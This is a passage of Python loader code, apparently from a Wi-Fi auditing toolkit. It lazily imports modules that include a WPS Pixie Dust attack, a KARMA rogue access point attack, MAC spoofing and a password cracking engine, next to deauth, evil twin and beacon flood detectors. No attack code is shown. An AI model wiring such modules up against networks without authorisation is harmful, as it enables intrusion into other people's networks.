    if not hasattr(get_deauth_detector, '_instance'):
        from modules.deauth_detect import DeauthDetector
        get_deauth_detector._instance = DeauthDetector
    return get_deauth_detector._instance

def get_pixie():
    """Lazy load pixie dust module."""
    if not hasattr(get_pixie, '_instance'):
        from modules.pixie_dust import PixieDustAttack
        get_pixie._instance = PixieDustAttack
    return get_pixie._instance

def get_evil_twin():
    """Lazy load evil twin module."""
    if not hasattr(get_evil_twin, '_instance'):
        from modules.evil_twin import EvilTwinDetector
        get_evil_twin._instance = EvilTwinDetector
    return get_evil_twin._instance

def get_karma():
    """Lazy load KARMA module."""
    if not hasattr(get_karma, '_instance'):
        from modules.karma import KARMAAttack
        get_karma._instance = KARMAAttack
    return get_karma._instance

def get_beacon_flood():
    """Lazy load beacon flood module."""
    if not hasattr(get_beacon_flood, '_instance'):
        from modules.beacon_flood import BeaconFloodDetector
        get_beacon_flood._instance = BeaconFloodDetector
    return get_beacon_flood._instance

def get_mac_spoof():
    """Lazy load MAC spoof module."""
    if not hasattr(get_mac_spoof, '_instance'):
        from modules.mac_spoof import MACSpoofer
        get_mac_spoof._instance = MACSpoofer
    return get_mac_spoof._instance

def get_cracker():
    """Lazy load cracker module."""
    if not hasattr(get_cracker, '_instance'):
        from modules.cracker import CrackingEngine
        get_cracker._instance = CrackingEngine
    return get_cracker._instance

def get_reporter():
    """Lazy load reporter module."""
    if not hasattr(get_reporter, '_instance'):
        from modules.reporter import ReportGenerator
        get_reporter._instance = ReportGenerator
    return get_reporter._instance

def get_dashboard():
    """Lazy load dashboard module."""
    if not hasattr(get_dashboard, '_instance'):
        from modules.dashboard import WebDashboard
        get_dashboard._instance = WebDashboard
    return get_dashboard._instance
